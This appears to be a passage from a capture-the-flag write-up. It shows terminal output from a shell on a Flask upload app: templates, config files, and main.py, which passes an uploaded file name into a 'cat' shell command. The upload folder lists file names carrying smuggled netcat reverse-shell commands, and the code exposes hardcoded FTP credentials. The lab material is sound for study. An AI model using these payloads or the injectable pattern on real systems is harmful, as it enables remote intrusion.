                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 6 -->
  <div class="portfolio-modal modal fade" id="portfolioModal6" tabindex="-1" role="dialog" aria-labelledby="portfolioModal6Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Submarine</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000033submarine.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript -->
  <script src="static/js/000048jquery.min.js"></script>
  <script src="static/js/000042bootstrap.bundle.min.js"></script>

  <!-- Plugin JavaScript -->
  <script src="static/js/000037jquery.easing.min.js"></script>

  <!-- Contact Form JavaScript -->
  <script src="static/js/000011jqBootstrapValidation.js"></script>
  <script src="static/js/000012contact_me.js"></script>

  <!-- Custom scripts for this template -->
  <script src="static/js/000014freelancer.min.js"></script>

</body>

bash-4.4$ cat prestart.sh
cat prestart.sh
#! /usr/bin/env sh

echo "Running inside /app/prestart.sh, you could add migrations to this file, e.g.:"

echo "
#! /usr/bin/env bash
```
```python
# Let the DB start
sleep 10;
```
```python
# Run migrations
alembic upgrade head
"

bash-4.4$ cat supervisord.pid
cat supervisord.pid
1

bash-4.4$ cat debug
cat debug
!#/bin/bash
export FLASK_APP=main.py
export DEBUG=1
flask run --host=0.0.0.0 --port=80

bash-4.4$ cat my-form.html
cat my-form.html
<!DOCTYPE html>
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
<!-- Custom fonts for this theme -->
  <link href="static/css/000058all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" 
type="text/css">

  <!-- Theme CSS -->
  <link href="static/css/000010freelancer.min.css" rel="stylesheet">
  <title>upload</title>

</head>
<html lang="en">
  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top">Tempus Fugit Durius</a>
      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" 
type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" 
aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="{{ url_for('home') }}">Back</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>
<body bgcolor='#28a745'>
<header class="masthead bg-primary text-white text-center">
<div class=container d-flex align-items-center flex-column>
    <center><h1>Upload script</h1>
    <form action="/upload" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="my-form" value="Upload !">
    </form></center>
</div>
</header>
<p>
	{% with messages = get_flashed_messages() %}
	  {% if messages %}
		<ul class=flashes>
		{% for message in messages %}
		  <li>{{ message }}</li>
		{% endfor %}
		</ul>
	  {% endif %}
	{% endwith %}
</p>

</body>
</html>

bash-4.4$ cd upload
cd upload
bash-4.4$ ls
ls
a.txt;nc 168301415 -e sh       a.txt;nc 168301415 443 -e ssh
a.txt;nc 168301415 443 -e sh   test.txt;nc 168301415 -e bash

bash-4.4$ cat main.cpython-36.pyc

or uploading�zThat filename was way too long!zcat r	T)r
                                                           zutf-8z�File successfully uploadedz
                                                                                              ftp.mofo.pwnsomeud

bash-4.4$ cat uwsgi.ini
cat uwsgi.ini
[uwsgi]
module = main
callable = app
uid=www
gid=www

bash-4.4$ cat main.py
cat main.py
import os
import urllib.request
from flask import Flask, flash, request, redirect, render_template
from ftplib import FTP
import subprocess

UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {'txt', 'rtf'}

app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
      cmd = 'fortune'
      result = subprocess.check_output(cmd, shell=True)
      return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>"+result.decode("utf-8")+"</h3>"
@app.errorhandler(500)
def internal_error(error):
    return "<h1>500?! - What are you trying to do here?!</h1>"

@app.route('/')

def home():
	return render_template('index.html')
	

@app.route('/upload')

def upload_form():
	try:
	    return render_template('my-form.html')
	except Exception as e:
	    return render_template("500.html", error = str(e))

def allowed_file(filename):
           check = filename.rsplit('.', 1)[1].lower()
           check = check[:3] in ALLOWED_EXTENSIONS    
           return check

def filtering(filename):
           filtered = filename.replace("#","")
           return filtered

@app.route('/upload', methods=['POST'])
def upload_file():
	if request.method == 'POST':

		if 'file' not in request.files:
			flash('No file part')
			return redirect(request.url)
		file = request.files['file']
		if file.filename == '':
			flash('No file selected for uploading')
			return redirect(request.url)
		if len(file.filename) > 30:
			flash('That filename was way too long!')
			return redirect(request.url)
 
		if file.filename and allowed_file(file.filename):
			filename = file.filename
			filename = filtering(filename)
			file.save(os.path.join(UPLOAD_FOLDER, filename))
			cmd="cat "+UPLOAD_FOLDER+"/"+filename
			result = subprocess.check_output(cmd, shell=True)
			flash(result.decode("utf-8"))
			flash('File successfully uploaded')
			
			try:
			   ftp = FTP('ftp.mofo.pwn')
			   ftp.login('someuser', '04653cr37Passw0rdK06')
			   with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
			      ftp.storlines('STOR %s' % filename, f)
			      ftp.quit()
			      os.remove(UPLOAD_FOLDER+"/"+filename)
			except:
			   flash("Cannot connect to FTP-server")
			return redirect('/upload')

		else:
			flash('Allowed file types are txt and rtf')
			return redirect(request.url)

if __name__ == "__main__":
    app.run()

ftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04653cr37Passw0rdK06')
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ftp 10.10.238.9  
ftp: Can't connect to `10.10.238.9:21': Connection refused
ftp: Can't connect to `10.10.238.9:ftp'

bash-4.4$ ftp 10.10.238.9
ftp 10.10.238.9
bash: ftp: command not found

using python
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat ftp.py       
